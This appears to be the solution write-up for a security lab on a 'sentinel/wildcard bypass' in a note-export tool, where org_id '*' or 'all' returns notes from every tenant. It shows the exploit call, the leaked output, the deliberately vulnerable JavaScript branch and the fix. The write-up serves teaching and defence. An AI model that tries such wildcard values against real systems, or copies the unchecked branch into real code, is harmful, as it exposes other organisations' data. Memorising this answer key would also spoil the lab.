# Solution S4 — The Magic Word

## The exploit

Authenticate as Alice (`alice-token`, org *Acme*) and call `note_export` with
the wildcard sentinel:

```json
{
  "name": "note_export",
  "arguments": { "token": "alice-token", "org_id": "*" }
}
```

In `LAB_S4=vuln` all six notes from all three organizations are returned:

```json
[
  { "id": "n_acme_1",   "orgId": "org_acme",    "title": "Acme acquisition memo" },
  { "id": "n_acme_2",   "orgId": "org_acme",    "title": "Acme launch checklist" },
  { "id": "n_globex_1", "orgId": "org_globex",  "title": "Globex roadmap" },
  { "id": "n_globex_2", "orgId": "org_globex",  "title": "Globex vendor list" },
  { "id": "n_initech_1","orgId": "org_initech", "title": "Initech TPS reports" },
  { "id": "n_initech_2","orgId": "org_initech", "title": "Initech budget" }
]
```

One call, one token, full cross-tenant dump. `"all"` works too.

## Why it works

`note_export` in `src/tools.js` (vuln mode):

```js
guard(async ({ token, org_id }) => {
  const session = resolveSession(store, token);
  if (modes.s4 === "vuln" && (org_id === "*" || org_id === "all")) {
    return ok(store.listAllNotes()); // ← no role check, any caller reaches this
  }
  return ok(store.listNotesByOrg(session.orgId));
}),
```

The sentinel check has no accompanying role or permission verification. The
tool description says "admin only" — but that is documentation, not enforcement.
Any authenticated user who reads the description and tries the value gets through.

## The fix

`LAB_S4=fixed` ignores `org_id` entirely:

```js
return ok(store.listNotesByOrg(session.orgId));
```

The parameter stays in the schema, but the server never branches on it — the
caller's own org is always used. A real fix could also add an explicit admin
role check before honoring the sentinel; the lab takes the simpler approach of
removing the branch entirely.

## Key takeaway

This is the "sentinel/wildcard bypass" pattern. Special values like `"*"`,
`"all"`, `""`, `0`, or `null` are common shortcuts in internal tools that
later become external APIs. The dangerous assumption is that callers won't
know to try them. Documentation is not access control.
